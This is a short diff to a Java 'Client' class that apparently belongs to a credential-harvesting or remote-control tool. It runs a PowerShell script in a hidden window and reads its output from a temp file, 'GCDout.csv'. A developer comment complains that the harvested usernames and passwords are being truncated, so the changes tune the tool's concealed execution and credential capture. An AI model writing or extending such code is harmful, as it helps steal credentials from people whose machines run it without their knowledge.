@@ -275,19 +275,17 @@ public class Client {
                         if (debugMode){ ioe.printStackTrace(); }
                     }
 
-                    String cmd = "powershell.exe -w hidden . " + fname + " > " + System.getProperty("java.io.tmpdir") + "pshout.txt";
+                    String cmd = "powershell.exe -w hidden . " + fname;
                     if (debugMode){System.out.println("Command: " + cmd);}
                     // Run the command
                     // TODO: fix >> CLIENT SIDE << bug below
                     // For some reason, the lines are being truncated at around 117-120 char mark, completely cutting off most usernames and passwords
 
-                    File outFile = new File(System.getProperty("java.io.tmpdir") + "pshout.txt");
-                    outFile.createNewFile();
+                    File outFile = new File(System.getProperty("java.io.tmpdir") + "GCDout.csv");
                     ProcessBuilder builder = new ProcessBuilder(cmd.split(" "));
                     builder.redirectErrorStream(true);
                     Process proc = builder.start();
                     // Read file
-                    //BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                     BufferedReader stdInput = new BufferedReader(new FileReader(outFile));
                     String s = null;
                     while ((s = stdInput.readLine()) != null){
